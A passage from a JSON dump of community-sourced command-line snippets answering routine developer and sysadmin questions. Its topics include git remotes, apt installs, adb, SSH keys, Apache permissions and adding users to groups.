    "description": "git pull origin master git push -u origin master\ngit remote add origin [//your github url]  //pull those changes  git pull origin master   // or optionally, 'git pull origin master --allow-unrelated-histories' if you have initialized repo in github and also committed locally  //now, push your work to your new repo  git push origin master    Credit to palerdot's answer on this post: https://stackoverflow.com/questions/18328800/github-updates-were-rejected-because-the-remote-contains-work-that-you-do-not-h\n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 335,
    "keyword": null,
    "link": null,
    "title": " UserWarning: Matplotlib is currently using agg, which is a non-GUI backend, so cannot show the figure. plt.show()",
    "description": "sudo apt-get install python3-tk \napt-get install python-tk or apt-get install python3-tk  It's safer to apt-get install python-tk on your machine(s).  (Works on Debian-derived distributions like for Ubuntu;  refer to your package manager and package list on other  distributions.)\nfrom matplotlib import pyplot pyplot.plot(your_plot) pyplot.savefig(\"output.png\")\n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 336,
    "keyword": null,
    "link": null,
    "title": " Using the 'memory' GSettings backend. Your settings will not be saved or shared with other applications.",
    "description": "export GIO_EXTRA_MODULES=/usr/lib/x86_64-linux-gnu/gio/modules/ \n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 337,
    "keyword": null,
    "link": null,
    "title": " Verificação de acesso de escrita [/srv/moodle/lib/editor/atto/plugins] Instalação abortada devido a falha de validação",
    "description": "A mensagem est&aacute; lhe dizendo que voc&ecirc; n&atilde;o tem permiss&atilde;o de escrita na pasta: /srv/moodle/lib/editor/atto/plugins Caso queira fazer as atualiza&ccedil;&otilde;es ou instala&ccedil;&otilde;es de novos plugins voc&ecirc; dever&aacute; dar permiss&atilde;o nessa pasta para o usu&aacute;rio do APACHE. Exemplo em distribui&ccedil;&otilde;es Debian/ubuntu:  chown -R www-data /srv/moodle/lib/editor/atto/plugins  Com o comando acima estamos dando permiss&atilde;o ao usu&aacute;rio www-data na pasta /srv/moodle/lib/editor/atto/plugins\n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 338,
    "keyword": null,
    "link": null,
    "title": " Veu command install",
    "description": "npm install -g @vue/cli # OR yarn global add @vue/cli \n",
    "reg_date": "2021-10-11T22:00:48.000Z"
  },
  {
    "id": 339,
    "keyword": null,
    "link": null,
    "title": " WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!",
    "description": "ssh-keygen -R {ip address}\nssh-keygen -R \"you server hostname or ip\" \n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 340,
    "keyword": null,
    "link": null,
    "title": " WARNING: UNPROTECTED PRIVATE KEY FILE!",
    "description": "sudo chmod -R 700 file_name.key\nsudo chmod 600 ~/.ssh/id_rsasudo chmod 600 ~/.ssh/id_rsa.pub\nsudo chmod 600 ~/.ssh/<your key's name> \nssh -i ~/.ssh/<name of your key> <username>@<ip address> \nadd sudo before ssh and then execute sudo ssh -i \"ma.pem\" ec2-user@ec2-54-83-120-103.compute-1.amazonaws.com  \ncp <path to your key> ~/.ssh/<name of your key> \n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 341,
    "keyword": null,
    "link": null,
    "title": " Warning: heroku update available from 7.47.4 to 7.47.5",
    "description": " heroku update  # this command will update heroku cli\n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 342,
    "keyword": null,
    "link": null,
    "title": " Warning: os-prober will not be executed to detect other bootable partitions. Systems on them will not be added to the GRUB boot configuration.",
    "description": "echo \"GRUB_DISABLE_OS_PROBER=false\" >> /etc/default/grub\n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 343,
    "keyword": null,
    "link": null,
    "title": " Warning in install.packages : installation of package ‘tidyverse’ had non-zero exit status",
    "description": "# Required for many packages sudo apt-get install -y libxml2-dev libcurl4-openssl-dev libssl-dev\n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 344,
    "keyword": null,
    "link": null,
    "title": " What causes a defunct process on the Linux system and how can you avoid it?",
    "description": "When you create a process, it sticks around until its parent reaps it.  (If its parent exits first, it will get auto-reaped.) A process can reap its children using wait or waitpid. It can also cause it's children to  be automatically reaped by using local $SIG{CHLD} = 'IGNORE'; before  creating the child.\n",
    "reg_date": "2021-10-11T22:00:49.000Z"
  },
  {
    "id": 345,
    "keyword": null,
    "link": null,
    "title": " What debian version do i use",
    "description": "lsb_release -a  #this shows all info about your distro.\n$ lsb_release -a\n",
    "reg_date": "2021-10-11T22:00:50.000Z"
  },
  {
    "id": 346,
    "keyword": null,
    "link": null,
    "title": " Which command should I use to display the exit code of the previous command?",
    "description": "echo $?\n",
    "reg_date": "2021-10-11T22:00:50.000Z"
  },
  {
    "id": 347,
    "keyword": null,
    "link": null,
    "title": " Why does terminal say: “You have mail”?",
    "description": "By yagooar  Type mail into terminal.  Then type in d * and press Enter.  The d command means delete and the * selects all mails in the list. Then press q to quit.\n",
    "reg_date": "2021-10-11T22:00:50.000Z"
  },
  {
    "id": 348,
    "keyword": null,
    "link": null,
    "title": " Why double tapping icon doesnt minimize in ubuntu",
    "description": "gsettings set org.gnome.shell.extensions.dash-to-dock click-action 'minimize'\ngsettings reset org.gnome.shell.extensions.dash-to-dock click-action\n",
    "reg_date": "2021-10-11T22:00:50.000Z"
  },
  {
    "id": 349,
    "keyword": null,
    "link": null,
    "title": " Write a Shell Script that makes use of grep to isolate the line in /etc/passwd that contains your login details.",
    "description": "# !/bin/bash username='whoami' grep \"^${username}: \" /etc/passwd \n",
    "reg_date": "2021-10-11T22:00:50.000Z"
  },
  {
    "id": 350,
    "keyword": null,
    "link": null,
    "title": " Write a code to extract each digit from an integer, in the reverse order",
    "description": "x = int(input('Enter a number : ')) y = int(str(x)[::-1]) print(\"The reversed number is:\" ,y)\n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 351,
    "keyword": null,
    "link": null,
    "title": " Wrong permissions on configuration file, should not be world writable!",
    "description": "sudo chmod 755 /opt/lampp/phpmyadmin/config.inc.php \n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 352,
    "keyword": null,
    "link": null,
    "title": " XAMPP: Starting Apache...fail.",
    "description": "sudo /etc/init.d/apache2 stop\nsudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start \nsudo /etc/init.d/apache2 stop sudo /opt/lampp/lampp start \n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 353,
    "keyword": null,
    "link": null,
    "title": " Yarn .gitignore for Zero Installs",
    "description": ".yarn/* !.yarn/cache !.yarn/patches !.yarn/plugins !.yarn/releases !.yarn/sdks !.yarn/versions\n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 354,
    "keyword": null,
    "link": null,
    "title": " Yarn .gitignore for not Zero Installs",
    "description": ".yarn/* !.yarn/patches !.yarn/releases !.yarn/plugins !.yarn/sdks !.yarn/versions .pnp.*\n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 355,
    "keyword": null,
    "link": null,
    "title": " You've successfully authenticated, but GitHub does not provide shell access.",
    "description": "git remote set-url origin git@github.com:<username>/<repo>.git\n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 356,
    "keyword": null,
    "link": null,
    "title": " You don't have permission to access this resource.",
    "description": "$ sudo systemctl restart apache2 \n####### Adjust directives in Apache main configuration file In Apache&rsquo;s main configuration file /etc/apache2/apache2.conf, ensure that you have this block of code:  <VirtualHost *:80> \t....    <Directory /var/www/html/PATH_TO_DIR/>       AllowOverride All       Require all granted   </Directory>    <Directory />           Options FollowSymLinks           AllowOverride None           Require all denied   </Directory>    <Directory /usr/share>           AllowOverride None           Require all granted   </Directory>    <Directory /var/www/>           Options Indexes FollowSymLinks           AllowOverride None           Require all granted   </Directory>  \t.....     .....      </VirtualHost>  Save and exit and thereafter, restart the Apache. sudo systemctl restart apache2\n<VirtualHost *:80>         ServerAdmin email         DocumentRoot /var/www         ServerName domain_or_ipAddress         <Directory /var/www/>                 AllowOverride All         </Directory>         ErrorLog ${APACHE_LOG_DIR}/error.log         CustomLog ${APACHE_LOG_DIR}/access.log combined </VirtualHost> \n",
    "reg_date": "2021-10-11T22:00:51.000Z"
  },
  {
    "id": 357,
    "keyword": null,
    "link": null,
    "title": " Your connection attempt failed for user 'root' to the MySQL server at localhost:3306: An AppArmor policy prevents this sender from sending this message to this recipient",
    "description": "sudo snap connect mysql-workbench-community:password-manager-service :password-manager-service\n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 358,
    "keyword": null,
    "link": null,
    "title": " Zenmap Install kali Linux",
    "description": "sudo apt update  sudo apt upgrade sudo apt alien  # Download zenmap rpm file from https://nmap.org/dist/  # Install Dependencies wget http://archive.ubuntu.com/ubuntu/pool/universe/p/pygtk/python-gtk2_2.24.0-5.1ubuntu2_amd64.deb wget http://azure.archive.ubuntu.com/ubuntu/pool/universe/p/pygobject-2/python-gobject-2_2.28.6-14ubuntu1_amd64.deb wget http://security.ubuntu.com/ubuntu/pool/universe/p/pycairo/python-cairo_1.16.2-2ubuntu2_amd64.deb  sudo dpkg -i python-gobject-2_2.28.6-14ubuntu1_amd64.deb  sudo dpkg -i python-cairo_1.16.2-2ubuntu2_amd64.deb sudo dpkg -i python-gtk2_2.24.0-5.1ubuntu2_amd64.deb   # Convert RPM file from DEB file sudo alien zenmap<push the Tab key to auto-complete>  # Install Zenmap sudo dpkg -i zenmap<push the Tab key to auto-complete>\n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 359,
    "keyword": null,
    "link": null,
    "title": " a.isdigit(): for negatives",
    "description": ">>>'-6'.lstrip('-') '6' >>>'-6'.lstrip('-').isdigit() True\n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 360,
    "keyword": null,
    "link": null,
    "title": " a2ensite example",
    "description": "a2ensite /etc/apache2/sites-available/new-domain.conf //----------------- a2dissite /etc/apache2/sites-available/new-domain.conf\na2ensite /etc/apache2/sites-available/new-domain.conf  //-----------------  a2dissite /etc/apache2/sites-available/new-domain.conf\n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 361,
    "keyword": null,
    "link": null,
    "title": " abnt linux keyboard",
    "description": "# On terminal: sudo setxkbmap -model abnt2 -layout br -variant abnt2 \n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 362,
    "keyword": null,
    "link": null,
    "title": " abort git merge",
    "description": "git merge --abort\ngit merge --abort \ngit reset --hard HEAD\ngit reset --hard HEAD~1 git reset --hard <commit_sha>\n",
    "reg_date": "2021-10-11T22:00:52.000Z"
  },
  {
    "id": 363,
    "keyword": null,
    "link": null,
    "title": " abort merge git",
    "description": "git merge --abort\ngit merge --abort \ngit reset --hard HEAD\n#git merge abort:  git merge --abort\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 364,
    "keyword": null,
    "link": null,
    "title": " acce;lerate ubuntu",
    "description": "sudo apt install preload sudo add-repository ppa:apt-fast/stable sudo apt update sudo apt install apt-fast\nsudo apt-get install preload\nsudo add-apt-repository ppa:apt-fast/stable sudo apt-get update sudo apt-get install apt-fast\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 365,
    "keyword": null,
    "link": null,
    "title": " access nodeport service from another machine in the same network",
    "description": "ssh -i ~/.minikube/machines/minikube/id_rsa docker@$(minikube ip) -L \\*:31000:0.0.0.0:31000\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 366,
    "keyword": null,
    "link": null,
    "title": " activate git case sensitive windows",
    "description": "git config core.ignorecase false\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 367,
    "keyword": null,
    "link": null,
    "title": " adb command to change screen refresh rate",
    "description": "adb shell settings put system peak_refresh_rate 96.0  adb shell settings put system min_refresh_rate 96.0\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 368,
    "keyword": null,
    "link": null,
    "title": " adb failed to connect to '192.168.0.9:5555': Connection refused",
    "description": "#connect your device via usb adb usb adb tcpip 5555 adb connect 192.168.10.1:5555\n",
    "reg_date": "2021-10-11T22:00:53.000Z"
  },
  {
    "id": 369,
    "keyword": null,
    "link": null,
    "title": " adb for ubuntu",
    "description": "sudo add-apt-repository ppa:nilarimogard/webupd8 sudo apt-get update sudo apt-get install android-tools-adb android-tools-fastboot \n",
    "reg_date": "2021-10-11T22:00:54.000Z"
  },
  {
    "id": 370,
    "keyword": null,
    "link": null,
    "title": " adb logcat unity",
    "description": " adb logcat -s Unity DEBUG\n",
    "reg_date": "2021-10-11T22:00:55.000Z"
  },
  {
    "id": 371,
    "keyword": null,
    "link": null,
    "title": " adb recorder",
    "description": "$ adb shell screenrecord /sdcard/video.mp4 #if you just get a black screen from recording - the resolution could be too high #set a custom record resolution with --size parameter  $ adb shell screenrecord --size 1280x720 /sdcard/video.mp4\n",
    "reg_date": "2021-10-11T22:00:55.000Z"
  },
  {
    "id": 372,
    "keyword": null,
    "link": null,
    "title": " adb shell grep command",
    "description": " #Gets screen capture of device every 270 seconds and outputs screencap to timestamped png file in local directory  while true; do adb shell screencap -p | perl -pe 's/\\x0D\\x0A/\\x0A/g' > ScreenCap.`date +%Y`.`date +%m`.`date +%d`-`date +%H`.`date +%M`.`date +%S`.png; sleep 270; done    #Gets logs from device and outputs them to a timestamped file in local directory  while true; do adb logcat -v time > logging`date +%Y`.`date +%m`.`date +%d`-`date +%H`.`date +%M`.`date +%S`.txt; done    #Gets PID of <packagename>  adb shell ps | grep <packagename>    #Outputs battery level to console  adb shell dumpsys battery | grep level    #Outputs battery usage for <packagename> to console every two seconds  while true; do adb shell dumpsys cpuinfo | grep <packagename>;adb shell dumpsys battery | grep level; sleep 2; done   #Gives permission to package to read logs  adb shell  su  pm grant <packagename> android.permission.READ_LOGS\n",
    "reg_date": "2021-10-11T22:00:55.000Z"
  },
  {
    "id": 373,
    "keyword": null,
    "link": null,
    "title": " adb shell list packages",
    "description": "adb shell pm list packages\n",
    "reg_date": "2021-10-11T22:00:55.000Z"
  },
  {
    "id": 374,
    "keyword": null,
    "link": null,
    "title": " adb shell screenshot",
    "description": "adb shell screencap -p /sdcard/screen.png adb pull /sdcard/screen.png adb shell rm /sdcard/screen.png\n",
    "reg_date": "2021-10-11T22:00:55.000Z"
  },
  {
    "id": 375,
    "keyword": null,
    "link": null,
    "title": " add-apt-repository",
    "description": "$ sudo apt-get install software-properties-common\n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 376,
    "keyword": null,
    "link": null,
    "title": " add-apt-repository command not found",
    "description": "// Ubuntu sudo apt-get install software-properties-common\nsudo apt-get install software-properties-common sudo apt-get update\n//Debian GNU/Linux and chromebook linux sudo apt install software-properties-common\napt-get install software-properties-common\n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 377,
    "keyword": null,
    "link": null,
    "title": " add a cookie to curl",
    "description": "curl -b 'session=abcdef' https://google.com\n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 378,
    "keyword": null,
    "link": null,
    "title": " add a linux header ubuntu 18.04",
    "description": "You should be able to install the kernel header files  for the currently running kernel by running the following  in a terminal:  sudo apt-get install linux-headers-$(uname -r)  In general, the kernel header packages are named  linux-header-* where \"*\" indicates the version & variant  (generic, server, etc.). \n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 379,
    "keyword": null,
    "link": null,
    "title": " add address to path cmd windows",
    "description": "set PATH=%PATH%;C:\\your\\path\\here\\\n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 380,
    "keyword": null,
    "link": null,
    "title": " add all files in directory to git",
    "description": "git add --all git commit -am \"<commit message>\" git push \n",
    "reg_date": "2021-10-11T22:00:56.000Z"
  },
  {
    "id": 381,
    "keyword": null,
    "link": null,
    "title": " add changes to last commit",
    "description": "git add the_left_out_file git commit --amend --no-edit \n$ (some_branch) git commit --amend\n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 382,
    "keyword": null,
    "link": null,
    "title": " add credentials to git",
    "description": "git config user.name \"your username\" git config user.password \"your password\"\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 383,
    "keyword": null,
    "link": null,
    "title": " add description to commit git",
    "description": "git commit -m \"Title\" -m \"Content\"\n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 384,
    "keyword": null,
    "link": null,
    "title": " add directory to path windows 10",
    "description": "setx /M PATH \"%PATH%;<your-new-path>\"\nC:\\> echo %PATH:;=&echo.%\n FOR MAC:   1&ordm; - Open Finder  2&ordm; - Choose Go > Go to folder  3&ordm; - Go to ~/Library/  4&ordm; - Look for hidden files: Cmd + Shift + . (dot)   5&ordm; - Depending on the shell you use, the file can be .bash_profile, or .bashrc, or .zshrc, ...  6&ordm; - Open that file in the text editor  7&ordm; - Add the new path like: export PATH=\"$PATH:\"User/new_path/...\"  8&ordm; - Test in your command line if it worked: echo $PATH  \n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 385,
    "keyword": null,
    "link": null,
    "title": " add dns in ubuntu permanently",
    "description": "sudo apt update sudo apt install resolvconf  sudo systemctl start resolvconf.service sudo systemctl enable resolvconf.service sudo systemctl status resolvconf.service  sudo vim /etc/resolvconf/resolv.conf.d/head and add the following lines in it: nameserver 8.8.8.8  nameserver 8.8.4.4  sudo systemctl start resolvconf.service\n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 386,
    "keyword": null,
    "link": null,
    "title": " add email git not working",
    "description": "git config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 387,
    "keyword": null,
    "link": null,
    "title": " add email to git config",
    "description": "To set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\n",
    "reg_date": "2021-10-11T22:00:57.000Z"
  },
  {
    "id": 388,
    "keyword": null,
    "link": null,
    "title": " add existing key to ssh",
    "description": "cp /path/to/my/key/id_rsa ~/.ssh/id_rsa cp /path/to/my/key/id_rsa.pub ~/.ssh/id_rsa.pub # change permissions on file sudo chmod 600 ~/.ssh/id_rsa sudo chmod 600 ~/.ssh/id_rsa.pub # start the ssh-agent in the background eval $(ssh-agent -s) # make ssh agent to actually use copied key ssh-add ~/.ssh/id_rsa\n$ eval \"$(ssh-agent -s)\" > Agent pid 59566\nGenerate ssh keys (Skip this step if you already have one). To generate new RSA keys, enter this on the command line. ssh-keygen -t -rsa Follow the prompts. You do not need to enter a file name but you should enter a password to make your key more secure. The default file name is id_rsa.pub . By default the key file is saved at ~/.ssh/id_rsa.pub . Copy your public keys to the remote server. scp ~/.ssh/id_rsa.pub user@your_ip:/ Add your public key to the authorized keys file on remote server To add you keys to the file, you can use the following command: cat ~/id_rsa.pub >> ~/.ssh/authorized_keys  If you do not have the folder ~/.ssh/authorized_keys , you can create this with the following commands: mkdir -p ~/.ssh touch ~/.ssh/authorized_keys Restart server for key changes to take effect\nsudo chmod 400 [key file] sudo ssh -i [key file] [username]@[ip]\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 389,
    "keyword": null,
    "link": null,
    "title": " add file to gitignore and remove from repo",
    "description": "git rm -r --cached .\ngit rm -r --cached some-directory git commit -m 'Remove the now ignored directory \"some-directory\"' git push origin master \n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 390,
    "keyword": null,
    "link": null,
    "title": " add git user and email",
    "description": "git config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\ngit config --global user.email \"my.adresse@hotmail.com\"\ngit config --global user.name \"My Name\"\ngit config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 391,
    "keyword": null,
    "link": null,
    "title": " add github repo",
    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ncreate a new repository on the command line echo \"# {Repo Name}\" >> README.md git init git add README.md git commit -m \"first commit\" git branch -M main git remote add origin https://github.com/cdcdianne/ReactJS-TheMovieDB.git git push -u origin main                  push an existing repository from the command line git remote add origin https://github.com/cdcdianne/ReactJS-TheMovieDB.git git branch -M main git push -u origin main\ngit configuration \ngit & github\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 392,
    "keyword": null,
    "link": null,
    "title": " add gpg key to zsh .zprofile",
    "description": "$ if [ -r ~/.zshrc ]; then echo 'export GPG_TTY=$(tty)' >> ~/.zshrc; \\   else echo 'export GPG_TTY=$(tty)' >> ~/.zprofile; fi\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 393,
    "keyword": null,
    "link": null,
    "title": " add kernel to jupyter",
    "description": "python -m ipykernel install --user --name=myenv \nconda activate myenv conda install ipykernel python -m ipykernel install --user --name myenv  --display-name \"myenv\"\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 394,
    "keyword": null,
    "link": null,
    "title": " add known host github",
    "description": "#Mac: ssh-keyscan -t rsa github.com >> ~/.ssh/known_hosts  #Windows: ssh-keyscan -t rsa github.com >> %userprofile%/.ssh/known_hosts\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 395,
    "keyword": null,
    "link": null,
    "title": " add material library angular",
    "description": "ng add @angular/material\n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 396,
    "keyword": null,
    "link": null,
    "title": " add onedrive to ubuntu",
    "description": "sudo apt-get install onedrive  onedrive  // Authenticate your account on the web // Copy the response url and paste it  onedrive -m // To sync in real time  onedrive // To sync\nsudo apt-get install onedrive  onedrive  // Authenticate your account on the web // Copy the response url and paste it  onedrive -m // To sync in real time  onedrive // To sync  man onedrive // Manual \n",
    "reg_date": "2021-10-11T22:00:58.000Z"
  },
  {
    "id": 397,
    "keyword": null,
    "link": null,
    "title": " add public key to server",
    "description": "ssh-copy-id -i ~/.ssh/mykey.pub user@host\nnano ~/.ssh/authorized_keys #then add your public key in the end (new line pls)\n",
    "reg_date": "2021-10-11T22:00:59.000Z"
  },
  {
    "id": 398,
    "keyword": null,
    "link": null,
    "title": " add remote origin git",
    "description": " git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\ngit remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git\ngit init . git remote add origin <http/someURL> git pull origin master\ngit remote add origin <link>\n",
    "reg_date": "2021-10-11T22:00:59.000Z"
  },
  {
    "id": 399,
    "keyword": null,
    "link": null,
    "title": " add router to vue",
    "description": "vue add router # Vue CLI\n",
    "reg_date": "2021-10-11T22:00:59.000Z"
  },
  {
    "id": 400,
    "keyword": null,
    "link": null,
    "title": " add rule ubuntu firewall",
    "description": "sudo ufw allow 20/tcp\n",
    "reg_date": "2021-10-11T22:00:59.000Z"
  },
  {
    "id": 401,
    "keyword": null,
    "link": null,
    "title": " add spacer to dock macos",
    "description": "# Add spacer to dock defaults write com.apple.dock persistent-apps -array-add '{\"tile-type\"=\"spacer-tile\";}' killall Dock\n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 402,
    "keyword": null,
    "link": null,
    "title": " add ssh key to github",
    "description": "$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n### ADD SSH key to Github  ###  # Check if you have a key? ssh-add -l  # If not? then follow steps to generate key ssh-keygen -t rsa -b 4096 -C your__gmail  # Now for copy the key use xclip tool or just goto file and copy sudo apt install xclip xclip -sel clip < ~/.ssh/id_rsa.pub  # Now goto github.com and goto settings  # select  SSH and GPG keys # New SSH key # Enter \"your__choice__name\" in title field... # Paste your public key into the Key field # Click Add SSH key  DONE!!!     \n> Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]\nssh-keygen -t ed25519 -C \"your_email@example.com\"\n> Generating public/private rsa key pair.\n> Enter passphrase (empty for no passphrase): [Type a passphrase] > Enter same passphrase again: [Type passphrase again]\n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 403,
    "keyword": null,
    "link": null,
    "title": " add submodule",
    "description": "$ git submodule add <remote_url> <destination_folder>\ngit clone --recurse-submodules\n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 404,
    "keyword": null,
    "link": null,
    "title": " add sudo user ubuntu",
    "description": "usermod -aG sudo username\n# add a user and set a password adduser USERNAME  # add user to sudoers / sudo groupe with command below usermod -aG sudo USERNAME \nsudo usermod -aG sudo [username] \necho \"username  ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/username\n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 405,
    "keyword": null,
    "link": null,
    "title": " add url git",
    "description": "$ git remote add origin https://github.com/user/repo.git # Set a new remote  $ git remote -v # Verify new remote > origin  https://github.com/user/repo.git (fetch) > origin  https://github.com/user/repo.git (push)\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git\ngit remote add origin git@git.assembla.com:portfolio/space.space_name.git#set a new remotegit remote -v#Verify new remoteorigin  git@git.assembla.com:portfolio/space.space_name.git (fetch)origin  git@git.assembla.com:portfolio/space.space_name.git (push)\n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 406,
    "keyword": null,
    "link": null,
    "title": " add user to docker group",
    "description": "sudo usermod -aG docker $USER sudo rm -fr /var/run/docker.sock && sudo reboot\n$ sudo groupadd docker $ sudo usermod -aG docker $USER $ newgrp docker \n# my case solution sudo setfacl -m user:$USER:rw /var/run/docker.sock  #other solution sudo usermod -aG docker $USER  #an other solution sudo groupadd docker sudo gpasswd -a $USER docker docker run hello-world\n# Creates docker group sudo groupadd docker  # Add your user to the docker group sudo usermod -aG docker $USER  # Log out and log back in so that your group membership is re-evaluated # GNOME example gnome-session-quit\nsudo usermod -aG docker $USER   #$USER is your username\n sudo gpasswd -a $USER docker \n",
    "reg_date": "2021-10-11T22:01:00.000Z"
  },
  {
    "id": 407,
    "keyword": null,
    "link": null,
    "title": " add user to group",
    "description": "usermod -a -G examplegroup exampleusername\n# add user to additional group  usermod -G groupname username\nsudo usermod -a -G <groupname> <username> e.g. sudo usermod -a -G wonderland alice\nusermod -a -G <group> <user> $ usermod -a -G developer tom\nfrom django.contrib.auth.models import User, Group from django.db.models.signals import post_save from django.dispatch import receiver  @receiver(post_save, sender=User) def create_user_profile(sender, instance, created, **kwargs):     if created:         instance.groups.add(Group.objects.get(name='group_name')) \nuseradd -g <group> <user> $ useradd -g developer tom\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 408,
    "keyword": null,
    "link": null,
    "title": " add user to group arch",
    "description": "usermod -a -G examplegroup exampleusername\n groups $username\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 409,
    "keyword": null,
    "link": null,
    "title": " add user to sudoers debian",
    "description": "usermod -aG sudo username\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 410,
    "keyword": null,
    "link": null,
    "title": " add user to sudoers ubuntu 20.04",
    "description": "sudo usermod -aG sudo <user>\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 411,
    "keyword": null,
    "link": null,
    "title": " adding jars to classpath in linux",
    "description": "vi ~/.bashrc export CLASSPATH=$CLASSPATH:/home/abc/lib/*; source ~/.bashrc\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 412,
    "keyword": null,
    "link": null,
    "title": " address already in use flask ubuntu",
    "description": "sudo fuser -k xxxx/tcp\n",
    "reg_date": "2021-10-11T22:01:01.000Z"
  },
  {
    "id": 413,
    "keyword": null,
    "link": null,
    "title": " adoni check migration status",
    "description": "adonis migration:status\n",
    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 414,
    "keyword": null,
    "link": null,
    "title": " adonis install",
    "description": "npm i -g @adonisjs/cli\n> npm i -g @adonisjs/cli\n",
    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 415,
    "keyword": null,
    "link": null,
    "title": " adonis migration run",
    "description": "adonis migration:run\nadonis make:migration\n",
    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 416,
    "keyword": null,
    "link": null,
    "title": " after installing manjaro kde",
    "description": "sudo pacman -Syu\n",
    "reg_date": "2021-10-11T22:01:02.000Z"
  },
  {
    "id": 417,
    "keyword": null,
    "link": null,
    "title": " aircrack-ng rtl8812au",
    "description": "sudo ip link set wlan0 down sudo iw dev wlan0 set type monitor sudo ip link set wlan0 up\nip link set wlan0 down iw dev wlan0 set type monitor ip link set wlan0 up\n",
